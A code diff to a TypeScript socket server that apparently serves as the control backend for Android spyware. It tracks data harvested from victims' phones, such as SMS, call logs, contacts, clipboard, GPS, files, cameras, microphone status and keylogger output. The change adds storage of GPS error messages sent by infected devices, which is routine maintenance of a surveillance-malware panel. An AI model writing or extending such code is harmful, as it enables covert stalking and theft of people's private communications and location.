@@ -165,7 +165,7 @@ class SocketService {
   }
 
   private ensureClientData(clientId: string): void {
-    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger'];
+    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger'];
     for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
   }
 
@@ -238,11 +238,14 @@ class SocketService {
     socket.on(CMD.LOCATION, (data: any) => {
       try {
         if (data.enabled === false || (data.latitude === undefined && data.longitude === undefined)) {
-          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${data.error || 'No location'}`);
+          const errMsg = data.error || 'No location';
+          dbHelpers.addLog('DATA', 'GPS', `GPS unavailable from ${id}: ${errMsg}`);
+          dbHelpers.setClientData(id, 'gps_error', JSON.stringify({ error: errMsg }));
           broadcastData('gps');
           return;
         }
         const gpsData = JSON.parse(dbHelpers.getOrCreateClientData(id, 'gps'));
+        dbHelpers.setClientData(id, 'gps_error', JSON.stringify(null));
         // Normalize timestamp: old APKs send epoch millis, new APKs send ISO string
         let timeValue = data.timestamp || data.time;
         if (typeof timeValue === 'number') {
